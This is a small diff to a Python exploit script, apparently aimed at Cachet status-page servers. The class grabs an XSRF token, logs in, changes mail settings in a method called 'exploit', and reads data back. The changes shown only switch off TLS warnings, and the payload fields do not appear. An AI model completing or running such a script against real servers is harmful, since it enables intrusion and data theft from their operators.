@@ -16,6 +16,7 @@ class Catchet():
         self.extract()
     
     def gettoken(self):
+        requests.packages.urllib3.disable_warnings()
         print("Getting XSRF token:")
         try:
             login_page = self.session.get(self.login_url)
@@ -26,6 +27,7 @@ class Catchet():
             print("Unable to get token :(")
 
     def login(self):
+        requests.packages.urllib3.disable_warnings()
         print("Loggin in")
         login_data = {
             "_token":self.token,
@@ -42,6 +44,7 @@ class Catchet():
             print("Unable to log in :(")
         
     def exploit(self):
+        requests.packages.urllib3.disable_warnings()
         print("Changing Mail Settings\n")
 
         mail_data = {
@@ -56,6 +59,7 @@ class Catchet():
         self.session.post(self.mail_url,data=mail_data)
 
     def extract(self):
+        requests.packages.urllib3.disable_warnings()
         get_data = self.session.get(self.mail_url)
         print("Getting Data")
 
